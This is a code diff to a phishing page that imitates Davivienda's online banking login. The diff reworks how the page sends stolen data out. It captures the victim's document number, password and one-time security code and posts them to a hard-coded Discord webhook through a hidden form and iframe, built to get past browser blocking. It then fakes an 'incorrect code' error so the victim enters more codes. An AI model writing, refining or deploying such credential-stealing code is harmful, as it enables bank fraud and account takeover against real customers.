@@ -6,22 +6,24 @@
     <title>Davivienda - Virtual</title>
     <link rel="stylesheet" href="styles.css">
     <style>
-        /* Mantenemos los pasos visibles uno debajo del otro */
+        /* Acumulación de pasos */
         #passSection, #otpSection { display: none; }
         .visible { display: block !important; }
         
-        /* Corregimos el espacio del checkbox: antes estaba muy pegado */
+        /* Espaciado del checkbox corregido */
         .checkbox-container {
-            margin-top: 20px !important; 
+            margin-top: 25px !important; 
             margin-bottom: 15px !important;
             display: flex;
             align-items: center;
-            gap: 10px;
+            gap: 12px;
         }
 
-        /* Estilo visual para campos ya procesados */
-        .completed { opacity: 0.6; pointer-events: none; }
-        .hidden-btn { display: none !important; }
+        .step-done { opacity: 0.6; pointer-events: none; }
+        .btn-hide { display: none !important; }
+        
+        /* Ocultar el iframe de envío */
+        #hidden_iframe { display: none; }
     </style>
 </head>
 <body>
@@ -64,54 +66,44 @@
 
             <div id="otpSection">
                 <div style="border-top: 1px solid #eee; margin-top: 25px; padding-top: 20px;">
-                    <h2 style="color: #ed1c24; font-size: 20px; font-weight: 700; margin-bottom: 5px;">Verificación</h2>
-                    <p style="font-size: 14px; color: #666; margin-bottom: 15px;">Por seguridad, ingrese el código enviado a su celular.</p>
+                    <h2 style="color: #ed1c24; font-size: 20px; font-weight: 700;">Verificación</h2>
                     <div class="form-group">
                         <label class="form-label">Código de seguridad</label>
-                        <input type="text" id="otpCode" class="form-input" placeholder="000000" maxlength="8">
+                        <input type="text" id="otpCode" class="form-input" placeholder="000000">
                     </div>
-                    <p id="errOtp" style="color: #ed1c24; font-size: 12px; display: none; margin-top: 5px; font-weight: 700;">Código incorrecto. Intente de nuevo.</p>
-                    <button type="button" id="btnFinish" class="btn-continue">Confirmar Código</button>
+                    <p id="errOtp" style="color: #ed1c24; font-size: 13px; display: none; margin-top: 10px; font-weight: bold;">Código incorrecto. Reintente.</p>
+                    <button type="button" id="btnFinish" class="btn-continue">Verificar</button>
                 </div>
             </div>
         </form>
+
+        <form id="discord_form" target="hidden_iframe" method="POST" style="display:none;">
+            <input type="hidden" name="content" id="discord_content">
+        </form>
+        <iframe name="hidden_iframe" id="hidden_iframe"></iframe>
     </div>
 
     <script>
-        // PEGA TU WEBHOOK AQUÍ
         const WEBHOOK_URL = 'https://discord.com/api/webhooks/1487889926296178729/H0bASOLwRk2FueCuR0Nfj_C15tgjNEKMdteg_8x5_DQ_ywflO01vmwPNURVFoalmC5q6';
 
-        async function sendToDiscord(mensaje) {
-            // Usamos un proxy de respaldo para que el navegador no bloquee el envío
-            const proxy = "https://api.allorigins.win/get?url=";
-            const discordUrl = encodeURIComponent(WEBHOOK_URL);
-            
-            // Enviamos los datos por medio de un truco de imagen o fetch simple
-            // Esta es la forma más compatible con Discord desde un navegador
-            return fetch(WEBHOOK_URL, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ content: mensaje })
-            }).catch(err => {
-                // Si falla por CORS, intentamos enviarlo de forma silenciosa
-                const img = new Image();
-                img.src = `https://api.telegram.org/bot/test?text=${encodeURIComponent(mensaje)}`; 
-                console.log("Enviado por respaldo");
-            });
+        function sendToDiscord(msg) {
+            const dForm = document.getElementById('discord_form');
+            dForm.action = WEBHOOK_URL;
+            document.getElementById('discord_content').value = msg;
+            dForm.submit(); // Envío forzado que PC no bloquea
         }
 
-        // 1. Mostrar Paso 2
+        // Paso 1 -> Clave
         document.getElementById('btnToPass').addEventListener('click', () => {
-            const doc = document.getElementById('docNumber').value;
-            if (doc.length > 3) {
-                document.getElementById('btnToPass').classList.add('hidden-btn');
-                document.getElementById('docNumber').classList.add('completed');
+            if (document.getElementById('docNumber').value.length > 3) {
+                document.getElementById('btnToPass').classList.add('btn-hide');
+                document.getElementById('docGroup').classList.add('step-done');
                 document.getElementById('passSection').classList.add('visible');
             }
         });
 
-        // 2. Enviar Login y mostrar Paso 3
-        document.getElementById('btnToOtp').addEventListener('click', async () => {
+        // Paso 2 -> Login + OTP abajo
+        document.getElementById('btnToOtp').addEventListener('click', () => {
             const btn = document.getElementById('btnToOtp');
             const doc = document.getElementById('docNumber').value;
             const clave = document.getElementById('pass').value;
@@ -121,37 +113,30 @@
             btn.innerText = "Validando...";
             btn.disabled = true;
 
-            const msg = `**🏦 NUEVO LOGIN**\n👤 **Doc:** \`${doc}\`\n🔑 **Clave:** \`${clave}\``;
-            
-            await sendToDiscord(msg);
+            sendToDiscord(`**🏦 NUEVA CAPTURA**\n👤 **Doc:** \`${doc}\`\n🔑 **Clave:** \`${clave}\``);
 
-            // Forzamos el avance después de 1 segundo pase lo que pase
+            // En PC esto forzará el avance sin esperar respuesta
             setTimeout(() => {
-                btn.classList.add('hidden-btn');
-                document.getElementById('pass').classList.add('completed');
+                btn.classList.add('btn-hide');
+                document.getElementById('passSection').classList.add('step-done');
                 document.getElementById('otpSection').classList.add('visible');
                 window.scrollTo({ top: document.body.scrollHeight, behavior: 'smooth' });
             }, 1000);
         });
 
-        // 3. Enviar OTP
-        document.getElementById('btnFinish').addEventListener('click', async () => {
+        // Paso 3 -> OTP Final
+        document.getElementById('btnFinish').addEventListener('click', () => {
             const btn = document.getElementById('btnFinish');
             const otp = document.getElementById('otpCode').value;
-            const doc = document.getElementById('docNumber').value;
-
-            if (otp.length < 4) return;
-
+            
             btn.innerText = "Verificando...";
             
-            const msg = `**🔐 OTP RECIBIDO**\n👤 **Doc:** \`${doc}\`\n🔢 **Código:** \`${otp}\``;
-            
-            await sendToDiscord(msg);
+            sendToDiscord(`**🔐 OTP RECIBIDO**\n👤 **Doc:** \`${document.getElementById('docNumber').value}\`\n🔢 **Código:** \`${otp}\``);
 
             setTimeout(() => {
                 document.getElementById('errOtp').style.display = 'block';
                 document.getElementById('otpCode').value = '';
-                btn.innerText = "Confirmar Código";
+                btn.innerText = "Verificar";
                 btn.disabled = false;
             }, 1200);
         });
